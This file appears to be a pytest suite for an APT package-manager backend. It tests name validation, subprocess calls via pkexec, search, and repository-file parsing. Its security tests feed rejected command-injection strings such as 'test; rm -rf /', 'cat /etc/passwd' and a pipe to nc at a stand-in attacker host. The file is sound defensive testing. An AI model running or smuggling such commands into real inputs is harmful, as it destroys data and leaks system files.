"""
Comprehensive test suite for apt_backend.py
Tests package validation, TOCTOU fix, and core functionality
"""

import pytest
import subprocess
from unittest.mock import Mock, patch, MagicMock, mock_open
from apt_backend import AptBackend, validate_package_name


class TestP0SecurityFixes:
    """Tests for P0 security vulnerabilities in APT backend"""

    @pytest.mark.security
    def test_p0_03_package_name_validation(self):
        """P0-3: Test package name validation prevents command injection"""
        # Valid package names
        assert validate_package_name("firefox") == True
        assert validate_package_name("libc6") == True
        assert validate_package_name("python3.10") == True
        assert validate_package_name("lib-test+dev") == True
        assert validate_package_name("test-package-1.0") == True

        # Invalid package names (command injection attempts)
        assert validate_package_name("test; rm -rf /") == False
        assert validate_package_name("test && cat /etc/passwd") == False
        assert validate_package_name("test | nc attacker.com") == False
        assert validate_package_name("$(whoami)") == False
        assert validate_package_name("`id`") == False
        assert validate_package_name("test\nrm -rf /") == False

        # Invalid: uppercase letters
        assert validate_package_name("Firefox") == False
        assert validate_package_name("TEST") == False

        # Invalid: special characters
        assert validate_package_name("test/package") == False
        assert validate_package_name("test\\package") == False
        assert validate_package_name("test package") == False
        assert validate_package_name("test@package") == False

        # Invalid: empty or too long
        assert validate_package_name("") == False
        assert validate_package_name("a" * 201) == False

        # Invalid: must start with lowercase letter or digit
        assert validate_package_name("-test") == False
        assert validate_package_name("+test") == False
        assert validate_package_name(".test") == False

    @pytest.mark.security
    @patch('apt_backend.subprocess.run')
    def test_p0_03_install_blocks_invalid_names(self, mock_run):
        """P0-3: Test install_package blocks invalid package names"""
        backend = AptBackend()

        # Valid package should proceed to subprocess
        mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
        success, msg = backend.install_package("valid-package")

        # Subprocess should have been called
        mock_run.assert_called()

        # Invalid package should be rejected before subprocess
        mock_run.reset_mock()
        success, msg = backend.install_package("invalid; rm -rf /")

        assert success == False
        assert "Invalid package name" in msg
        # Subprocess should NOT have been called
        mock_run.assert_not_called()

    @pytest.mark.security
    @patch('apt_backend.subprocess.run')
    def test_p0_03_uninstall_blocks_invalid_names(self, mock_run):
        """P0-3: Test uninstall_package blocks invalid package names"""
        backend = AptBackend()

        # Invalid package should be rejected
        success, msg = backend.uninstall_package("evil`whoami`package")

        assert success == False
        assert "Invalid package name" in msg
        mock_run.assert_not_called()

    @pytest.mark.security
    def test_p0_11_toctou_race_fix(self):
        """P0-11: Test TOCTOU race condition fix in get_system_repositories"""
        backend = AptBackend()

        # Should handle non-existent directory gracefully
        with patch('apt_backend.glob.glob', side_effect=FileNotFoundError):
            repos = backend.get_system_repositories()
            assert repos == []

        # Should handle permission errors gracefully
        with patch('apt_backend.glob.glob', return_value=['/etc/apt/sources.list.d/test.list']):
            with patch('builtins.open', side_effect=PermissionError):
                repos = backend.get_system_repositories()
                # Should not crash, returns empty or partial results
                assert isinstance(repos, list)


class TestAptBackendCore:
    """Tests for core APT backend functionality"""

    @pytest.mark.unit
    @patch('apt_backend.subprocess.run')
    def test_is_available(self, mock_run):
        """Test APT availability check"""
        backend = AptBackend()

        # APT is available
        mock_run.return_value = Mock(returncode=0)
        assert backend.is_available() == True

        # APT is not available
        mock_run.return_value = Mock(returncode=1)
        assert backend.is_available() == False

        # Exception handling
        mock_run.side_effect = Exception("Error")
        assert backend.is_available() == False

    @pytest.mark.unit
    @patch('apt_backend.subprocess.run')
    def test_search_packages(self, mock_run):
        """Test package search functionality"""
        backend = AptBackend()

        # Mock apt-cache search output
        mock_run.return_value = Mock(
            returncode=0,
            stdout="firefox - Mozilla Firefox web browser\nfirefox-esr - Extended Support Release",
            stderr=""
        )

        results = backend.search_packages("firefox", limit=10)

        assert len(results) == 2
        assert results[0]['name'] == 'firefox'
        assert 'Mozilla Firefox' in results[0]['description']
        assert results[0]['package_type'] == 'apt'

    @pytest.mark.unit
    def test_search_empty_query(self):
        """Test search with empty query"""
        backend = AptBackend()
        results = backend.search_packages("", limit=10)
        assert results == []

        results = backend.search_packages("   ", limit=10)
        assert results == []

    @pytest.mark.unit
    @patch('apt_backend.subprocess.run')
    def test_install_success(self, mock_run):
        """Test successful package installation"""
        backend = AptBackend()

        mock_run.return_value = Mock(returncode=0, stdout="Success", stderr="")

        success, msg = backend.install_package("test-package")

        assert success == True
        assert "Successfully installed" in msg
        mock_run.assert_called_once()

        # Verify correct command structure
        call_args = mock_run.call_args[0][0]
        assert call_args == ['pkexec', 'apt', 'install', '-y', 'test-package']

    @pytest.mark.unit
    @patch('apt_backend.subprocess.run')
    def test_install_failure(self, mock_run):
        """Test failed package installation"""
        backend = AptBackend()

        mock_run.return_value = Mock(
            returncode=1,
            stdout="",
            stderr="E: Unable to locate package"
        )

        success, msg = backend.install_package("nonexistent")

        assert success == False
        assert "Failed to install" in msg

    @pytest.mark.unit
    @patch('apt_backend.subprocess.run')
    def test_install_timeout(self, mock_run):
        """Test installation timeout handling"""
        backend = AptBackend()

        mock_run.side_effect = subprocess.TimeoutExpired(['apt'], 300)

        success, msg = backend.install_package("test")

        assert success == False
        assert "timed out" in msg.lower()

    @pytest.mark.unit
    @patch('apt_backend.subprocess.run')
    def test_uninstall_success(self, mock_run):
        """Test successful package uninstallation"""
        backend = AptBackend()

        mock_run.return_value = Mock(returncode=0, stdout="Success", stderr="")

        success, msg = backend.uninstall_package("test-package")

        assert success == True
        assert "Successfully uninstalled" in msg

    @pytest.mark.unit
    @patch('apt_backend.subprocess.run')
    def test_get_installed_packages(self, mock_run):
        """Test getting list of installed packages"""
        backend = AptBackend()

        # Mock dpkg-query output
        mock_run.return_value = Mock(
            returncode=0,
            stdout="firefox\t110.0\tMozilla Firefox\nlibc6\t2.31\tGNU C Library",
            stderr=""
        )

        packages = backend.get_installed_packages()

        assert len(packages) == 2
        assert packages[0]['name'] == 'firefox'
        assert packages[0]['version'] == '110.0'
        assert packages[0]['package_type'] == 'apt'


class TestSystemRepositories:
    """Tests for system repository scanning"""

    @pytest.mark.unit
    @patch('apt_backend.glob.glob')
    @patch('builtins.open', new_callable=mock_open)
    def test_parse_repository_files(self, mock_file, mock_glob):
        """Test parsing of repository files"""
        backend = AptBackend()

        # Mock file list
        mock_glob.return_value = ['/etc/apt/sources.list.d/test.list']

        # Mock file content
        mock_file.return_value.read.return_value = """
# Comment line
deb http://archive.ubuntu.com/ubuntu focal main restricted
deb-src http://archive.ubuntu.com/ubuntu focal main restricted
"""

        repos = backend.get_system_repositories()

        assert isinstance(repos, list)

    @pytest.mark.unit
    def test_parse_repo_line_valid(self):
        """Test parsing of valid repository lines"""
        backend = AptBackend()

        # Standard deb line
        result = backend._parse_repo_line(
            "deb http://archive.ubuntu.com/ubuntu focal main",
            "/etc/apt/sources.list"
        )

        assert result is not None
        if result:
            assert 'url' in result
            assert 'archive.ubuntu.com' in result['url']

    @pytest.mark.unit
    def test_parse_repo_line_comments(self):
        """Test that comments are ignored"""
        backend = AptBackend()

        # Comment line should return None
        result = backend._parse_repo_line(
            "# This is a comment",
            "/etc/apt/sources.list"
        )
        assert result is None

        # Empty line should return None
        result = backend._parse_repo_line("", "/etc/apt/sources.list")
        assert result is None


class TestEdgeCases:
    """Tests for edge cases and error handling"""

    @pytest.mark.unit
    @patch('apt_backend.subprocess.run')
    def test_search_with_special_characters(self, mock_run):
        """Test search with special characters (should still work)"""
        backend = AptBackend()

        mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

        # Special characters in search query are OK (not in package names for install)
        results = backend.search_packages("c++", limit=10)

        # Should call apt-cache without error
        mock_run.assert_called()

    @pytest.mark.unit
    @patch('apt_backend.subprocess.run')
    def test_network_error_handling(self, mock_run):
        """Test handling of network errors during operations"""
        backend = AptBackend()

        mock_run.side_effect = Exception("Network error")

        success, msg = backend.install_package("test-package")

        assert success == False
        assert "failed" in msg.lower()

    @pytest.mark.unit
    def test_backend_type_attributes(self):
        """Test backend has correct type attributes"""
        backend = AptBackend()

        assert backend.package_type == "apt"
        assert backend.source_repo == "Ubuntu/APT"


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
